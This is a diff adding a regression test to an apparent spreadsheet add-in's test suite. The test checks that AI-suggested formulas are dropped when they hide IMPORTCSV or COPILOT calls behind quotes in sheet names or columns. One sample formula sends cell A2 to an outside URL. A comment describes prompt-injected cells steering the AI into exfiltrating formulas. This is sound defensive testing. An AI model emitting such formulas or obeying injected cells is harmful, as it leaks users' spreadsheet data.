@@ -302,6 +302,23 @@ def test_an_ai_formula_naming_a_share_or_path_that_is_not_a_workbook_file_is_lef
     assert "(Left out D3: the formula reached outside this workbook.)" in out["explanation"]
 
 
+@pytest.mark.parametrize("formula", ["=SUM('\"'!A1,IMPORTCSV(\"https:\"&\"//x/?\"&A2),'\"'!A1)",
+                                     '=SUM(T[a"b],COPILOT(A1),T[c"d])'])
+def test_an_ai_formula_hiding_a_call_between_quotes_in_sheet_names_or_columns_is_left_out(monkeypatch, formula):
+    # AH-160: strings were blanked before sheet names, so a " inside 'a sheet' or T[a column] opened a fake string
+    # that hid IMPORTCSV or COPILOT from the safe list, and the card kept the formula
+    wide = COLS + ["D", "E"]
+    answer = {"explanation": "x", "changes": [{"cell": "D3", "new": formula},
+                                              {"cell": "E3", "new": "='Q1 sales'!B2+SUM(Table1[it''s])"}]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = client.suggest_fix(wide, [r + ["", ""] for r in ROWS], 1, 0, 0, "", "fill D")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["E3"]  # a quote in a sheet name or a column, as Excel writes it, is kept
+    assert "(Left out D3: the formula used a function that is not on this add-in's safe list.)" in out["explanation"]
+
+
 def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeypatch):
     # 2026-10-15 audit: the old blocklist let these through. Each one can send the sheet's data out, or read
     # another workbook, after a prompt-injected cell talks the AI into it (the user still sees a preview).
